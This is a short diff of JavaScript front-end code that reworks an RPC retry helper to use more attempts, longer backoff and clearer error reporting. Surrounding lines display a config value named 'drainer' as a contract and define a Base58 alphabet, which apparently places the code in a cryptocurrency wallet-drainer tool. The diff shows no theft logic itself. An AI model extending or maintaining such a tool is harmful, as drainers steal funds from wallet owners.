@@ -132,14 +132,21 @@ async function loadConfig() {
   $('contract').textContent = cfg.drainer || 'вЂ”';
 }
 
-async function rpc(method, params, tries = 6) {
+async function rpc(method, params, tries = 8) {
+  let last = 'network';
   for (let i = 0; i < tries; i++) {
     const r = await fetch(RPC + method, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify(params) });
     const t = await r.text();
-    if (t.startsWith('{')) return JSON.parse(t);
-    await sleep(600 * (i + 1));
+    if (t.startsWith('{')) {
+      const j = JSON.parse(t);
+      if (!j.Error) return j;
+      last = j.Error;
+    } else {
+      last = 'http ' + r.status;
+    }
+    await sleep(900 * (i + 1));
   }
-  throw new Error('network');
+  throw new Error(last);
 }
 
 const B58 = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
